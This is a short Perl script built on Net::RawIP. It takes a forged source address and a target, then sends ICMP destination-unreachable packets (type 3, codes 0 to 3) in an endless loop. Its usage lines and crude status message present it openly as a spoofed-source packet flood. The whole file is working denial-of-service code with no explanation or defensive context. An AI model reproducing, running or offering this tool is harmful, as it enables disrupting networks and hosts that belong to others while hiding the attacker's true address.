use Net::RawIP;

print "Usage   =?  $0 <spoofed address> <target>\n";
print "Example =? perl $0 133.71.33.7 192.168.1.1\n";

my $spoof          = $ARGV[0];
my $target         = $ARGV[1];

my $sock =  new Net::RawIP({ icmp => {} }) or die;

while () {
    print "Sending a fuckton of packets ICMPV4-6\n";

    $sock->set({  ip =>  { saddr  => $spoof, daddr => $target},
                icmp =>  { type => 3, code => 3} });
    $sock->send;
    $sock->set({  icmp => { type=>3, code => 0}});
    $sock->send;
    $sock->set({  icmp => { type=>3, code => 1}});
    $sock->send;
    $sock->set({  icmp => { type=>3, code => 2}});
    $sock->send;
}
